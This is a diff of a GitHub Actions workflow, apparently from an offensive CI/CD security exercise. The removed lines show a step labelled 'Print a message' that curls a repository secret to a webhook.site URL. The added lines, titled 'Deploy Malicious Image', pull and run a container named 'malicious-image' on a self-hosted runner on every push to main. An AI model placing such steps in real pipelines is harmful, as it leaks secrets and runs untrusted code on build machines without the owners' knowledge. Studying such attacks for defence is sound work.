@@ -1,14 +1,25 @@
-name: Simple Echo Workflow
+name: Deploy Malicious Image
 
-on: 
+on:
   push:
     branches:
       - main
 
 jobs:
-  echo-job:
-    runs-on: ubuntu-latest
-    environment: my_env
+  deploy:
+    runs-on: self-hosted
     steps:
-      - name: Print a message
-        run: curl "http://webhook.site/41c6b745-9747-4b36-9965-72752cbf04e0/value=${{ secrets.SEC_NAME }}"
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Log in to Azure Container Registry
+        run: echo "${{ secrets.ACR_PASSWORD }}" | docker login offensivewebapp.azurecr.io -u ${{ secrets.ACR_USERNAME }} --password-stdin
+
+      - name: Pull malicious image
+        run: docker pull offensivewebapp.azurecr.io/malicious-image:latest
+
+      - name: Run container from image
+        run: docker run -d --name malicious-container -p 8080:80 offensivewebapp.azurecr.io/malicious-image:latest
+
+      - name: Simulate deployment step
+        run: curl http://localhost:8080 || echo "Simulated check app may not respond here in CI"
